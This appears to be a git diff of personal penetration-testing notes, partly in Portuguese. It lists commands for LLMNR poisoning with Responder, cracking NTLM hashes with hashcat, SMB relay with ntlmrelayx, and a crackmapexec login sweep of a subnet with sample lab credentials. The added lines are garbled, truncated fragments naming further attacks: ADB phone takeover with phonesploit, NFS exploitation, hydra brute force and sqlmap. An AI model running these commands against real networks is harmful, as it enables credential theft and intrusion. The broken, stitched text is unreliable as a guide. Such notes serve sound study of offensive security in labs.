@@ -1,6 +1,6 @@
 # LLMNR Poisoning 
 
-sudo responder -I eth0 -dwP
+sudo responder -I eth0 -dwP 9Using Misconfigured NFS (2049) 
 hashcat –m 5600 <hashfile.txt> <wordlist.txt>
 
 # SMB Relay Attacks
@@ -16,7 +16,7 @@ Utilizaremos Responder e ntlmrelayx para nosso ataque. Devemos primeiro configur
 sudo nano  /etc/responder/Responder.conf
 
 sudo responder –I eth0 -dwP
-
+irst look for the port adb (5555) open in which network, use phonesploit to access the device, For scanning elf files use Detect it easy 
 
 
 Por fim, iniciaremos o ntlmrelayx e aguardaremos a ocorrência de um evento.
@@ -24,3 +24,6 @@ Por fim, iniciaremos o ntlmrelayx e aguardaremos a ocorrência de um evento.
 sudo ntlmrelayx.py –tf targets.txt –smb2support
 
 crackmapexec smb 192.168.28.0/24 -u peter -d MARVEL.local -p Password123
+14log4j vulnerability / bruteforce login / sglmap login form / OWAZP Zap 
+6heck for NFS port(2049) open, then exploit by using NFS Or try using hydra for SSH and FTP 
+
